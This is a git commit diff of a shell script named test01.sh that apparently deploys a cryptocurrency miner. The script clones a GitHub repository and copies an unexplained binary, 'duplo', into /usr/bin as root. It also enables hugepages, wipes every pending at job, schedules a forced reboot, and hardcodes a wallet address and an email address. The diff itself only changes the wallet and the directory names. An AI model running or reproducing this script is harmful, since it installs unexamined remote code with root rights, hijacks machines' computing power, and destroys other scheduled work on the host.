6aa52729fa22e92f03575b9d9934bcafe98fae0e
rekek <47266646+rekek@users.noreply.github.com>
2019-02-13 13:00:16 -0800

    Update test01.sh

--- test01.sh
+++ test01.sh
@@ -1,29 +1,29 @@
 #!/bin/bash
 
-WALLET=46hET53HZrBFj4NxgT9hXDLnAu93yuXToZ5LUHGGxbPd8ma73AWCWngPGivVm4ZraWSsJobk8eQaRbD5fqrSmgQ7DGF8Qnm
+WALLET=4B2ABqe1RZKYJ41ZD6xUpVjHJuhZWwLfB5hVEqUgP9QmZDzJC5Xzmv1VKrHLWhtc546uNcQuZvKCbYJ7wGkE29htKzAwLcD
 ID="$(hostname)"
 MAIL=kotminkot@yandex.ru
 PASSWORD=$ID:$MAIL
 THREADS="$(nproc --all)"
 
-rm -rf /tmp/server7/
+rm -rf /tmp/server9/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir server7
-git clone https://github.com/rekek/server7.git /tmp/server7
-cd /tmp/server7
-chmod +x /tmp/server7/duplo
+cd /tmp && mkdir server9
+git clone https://github.com/rekek/server9.git /tmp/server9
+cd /tmp/server9
+chmod +x /tmp/server9/duplo
 chmod 777 ./*.sh
-cp /tmp/server7/duplo /usr/bin/
+cp /tmp/server9/duplo /usr/bin/
 sleep 3
 
 touch /tmp/at.txt
 echo 'sudo reboot -f' >> /tmp/at.txt
-at now + 1 hours < /tmp/at.txt
+at now + 3 hours < /tmp/at.txt
 echo -e 'Restart job specified'
 sleep 3
 sudo apt-get install dos2unix
